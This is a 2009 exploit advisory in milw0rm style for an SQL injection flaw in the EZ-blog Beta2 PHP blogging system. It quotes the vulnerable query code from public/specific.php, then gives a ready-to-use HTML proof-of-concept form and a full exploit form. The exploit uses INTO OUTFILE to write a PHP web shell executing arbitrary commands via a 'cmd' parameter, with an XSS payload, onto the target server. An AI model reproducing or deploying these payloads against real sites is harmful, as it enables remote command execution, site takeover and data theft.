@@ -1,0 +1,180 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	    	  SQL INJECTION VULNERABILITY		             	     |
+|--------------------------------------------------------------------------------------------|
+|                         	| 	  EZ-blog Beta2        |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://sourceforge.net/projects/ez-blog/          				     |
+|-->DOWNLOAD: http://sourceforge.net/projects/ez-blog/            	                     |
+|-->DEMO: N/A										     |
+|-->CATEGORY: CMS / Blogging								     |
+|-->DESCRIPTION: EZ-Blog is an open-source blog program written in PHP.       	             |
+|		Presently, only MySQL is supported, but a PostgreSQL version is planned.     |
+|-->RELEASED: 2009-04-26								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: N/A									             |
+|-->CATEGORY: SQL INJECTION (SHELL UPLOAD)					             |
+|-->AFFECT VERSION: <=1 Beta2						 		     |
+|-->Discovered Bug date: 2009-04-26							     |
+|-->Reported Bug date: 2009-04-27							     |
+|-->Fixed bug date: Not fixed								     |
+|-->Info patch: Not fixed							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#########################
+////////////////////////
+
+SQL INJECTION (SQLi):
+
+////////////////////////
+#########################
+
+
+<<<<---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++--------->>>>
+
+
+-------
+INTRO:
+-------
+
+
+An exploit was published by drosophila with Multiple SQL Injection in EZ-blog Beta-1, 
+they've (apparently) fixed it but the system is still vulnerable.
+
+
+Source: http://www.milw0rm.com/exploits/8128
+
+
+-----------
+FILE VULN:
+-----------
+
+Path --> [HOME_PATH]/public/specific.php
+
+...
+
+$whichcategory = Trim($_POST['category']);
+
+...
+	if ($whichcategory=='All'){
+		$query  = "SELECT * FROM content ORDER BY id DESC";	
+	}else{
+		$query  = "SELECT * FROM content WHERE  topic ='" . $whichcategory . "' ORDER BY id DESC";
+	}	
+	$result = mysql_query($query);
+...
+
+
+------------------
+PROOF OF CONCEPT:
+------------------
+
+Copy and save --> PoC.html.
+Configure --> HOST, HOME_PATH
+
+<html>
+<title>
+PoC BY Y3NH4CK3R --PROUD TO BE SPANISH-->
+</title>
+<h1>
+Click "Execute PoC" to launch the proof of concept (SQLi)...
+</h1>
+<body bgcolor=#000000 text=#ffffff>
+<form method="post" action="http:[HOST]/[HOME_PATH]/public/specific.php">
+<input type="hidden" name="category" value="-1' union all select version(),version(),version(),version(),version(),version(),version(),version()/*">
+<input name="submit" value="Execute PoC" type="submit">
+</form>
+<br>
+<br>
+<h2>
+<font color=#ff0000>
+BY y3nh4ck3r. Contact: y3nh4ck3r@gmail.com
+</font>
+</h2>
+</body>
+</html>
+
+
+------------------------
+EXPLOIT (SHELL UPLOAD):
+------------------------
+
+This aplication hasn't admin authentication using DB, ie, admin panel uses .htaccess file. 
+This is a complete exploit: SQL Injection --> Shell Upload, and XSS...all in one ;)
+
+Copy and save --> exploit.html.
+Configure --> HOST, HOME_PATH and COMPLETE-PATH.
+
+
+<html>
+<title>
+PoC BY Y3NH4CK3R --PROUD TO BE SPANISH-->
+</title>
+<h1>
+Click "Upload shell" to launch the exploit (SQLi)...
+</h1>
+<body bgcolor=#000000 text=#ffffff>
+<form method="post" action="http://[HOST]/[HOME_PATH]/public/specific.php">
+<input type="hidden" name="category" value="-1' union all select '<HTML><title>SHELL BY --Y3NH4CK3R--></title><body text=#ffffff bgcolor=#000000><center><h1>','YOUR SHELL IS ON!<br></h1></center><br><br>','<font color=#ff0000><h2>Get var (cmd) to execute comands. Enjoy it!</h2></font>','<script>alert(String.fromCharCode(67,111,109,109,97,110,100,32,101,120,101,99,117,116,101,100,33))</script>','<h3>Command Result:</h3>','<?php system($_GET[cmd]); ?>','<br><br><font color=#ff0000><h3>By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com</h3></font></body>','</HTML>' INTO OUTFILE '[COMPLETE-PATH]/public/shell.php'/*">
+<input name="submit" value="Upload shell" type="submit">
+</form><br>
+<h3>
+Your shell in "http://[HOST]/[HOME_PATH]/public/shell.php"
+</h3>
+<br>
+<h2>
+<font color=#ff0000>
+BY y3nh4ck3r. Contact: y3nh4ck3r@gmail.com
+</font>
+</h2>
+</body>
+</html>
+
+
+Your shell in --> http://[HOST]/[HOME_PATH]/public/shell.php
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+##  GREETZ TO: drosophila, JosS and all SPANISH Hack3Rs community!   ##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-04-27]
